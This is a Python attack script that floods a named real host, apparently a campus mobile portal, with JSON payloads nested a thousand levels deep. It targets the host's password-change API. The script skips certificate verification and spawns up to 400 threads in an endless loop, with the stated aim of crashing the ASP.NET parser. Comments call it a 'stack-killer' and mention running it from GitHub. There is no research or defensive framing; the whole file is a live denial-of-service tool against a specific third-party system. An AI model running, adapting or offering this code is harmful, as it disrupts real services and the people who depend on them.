import socket, ssl, threading, time

HOST = "fmobile.rpscampus.in"
URL = "/api/changepassword"

# --- THE STACK-KILLER PAYLOAD ---
# 1000 layers is almost guaranteed to crash an ASP.NET 4.0 parser
nesting_level = 1000
payload = ("{\"a\":" * nesting_level) + "1" + ("}" * nesting_level)
payload_bytes = payload.encode('utf-8')
content_length = len(payload_bytes)

def launch_strike():
    try:
        sock = socket.create_connection((HOST, 443), timeout=5)
        context = ssl._create_unverified_context()
        ssock = context.wrap_socket(sock, server_hostname=HOST)

        request = (
            f"POST {URL} HTTP/1.1\r\n"
            f"Host: {HOST}\r\n"
            "Content-Type: application/json\r\n"
            f"Content-Length: {content_length}\r\n"
            "Connection: close\r\n\r\n"
        ).encode('utf-8') + payload_bytes

        ssock.sendall(request)
        
        # Capture the response to confirm the 500 crash
        response = ssock.recv(1024).decode('utf-8', errors='ignore')
        if "500" in response:
            # We don't print every time to save GitHub logs, just a heart-beat
            pass
            
        ssock.close()
    except:
        pass

if __name__ == "__main__":
    print(f"--- STACK-OVERFLOW PROTOCOL ACTIVE ---")
    print(f"[!] Target: {HOST} | Nesting: {nesting_level} layers")
    
    while True:
        if threading.active_count() < 400: # Scale based on GitHub performance
            threading.Thread(target=launch_strike, daemon=True).start()
        else:
            time.sleep(0.01)
